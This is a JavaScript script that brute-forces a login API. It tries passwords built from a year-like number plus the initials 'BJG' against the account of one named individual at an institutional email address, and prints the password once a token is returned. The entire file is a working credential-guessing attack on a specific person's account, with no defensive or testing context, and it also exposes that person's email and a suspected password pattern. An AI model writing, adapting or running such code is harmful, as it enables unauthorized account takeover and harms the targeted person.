
const bruteforce = async () => {
    const password_initials = "BJG"
    const email = "bidyut@iimshillong.ac.in"
    let i = 2000 
    // let j = 3000

    for (i; i<=2100; i++){
        const password = `${i}@${password_initials}`
        const response = await fetch(`http://proxy.nimbushq.xyz/api/login`, {
            method: 'POST',
            body: JSON.stringify({ email, password}),
            headers: {
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'Authorization': `Bearer ${''}`
            }
        })
        const res = await response.json();

        console.log("🚀 ~ bruteforce ~ res:", res);

        if (res.token && res.token.length > 0) {
            console.log(`Password found: ${password}`)
            break;
        } else {
            console.log(`Not the password: ${password}`)
        }
    }
}

bruteforce()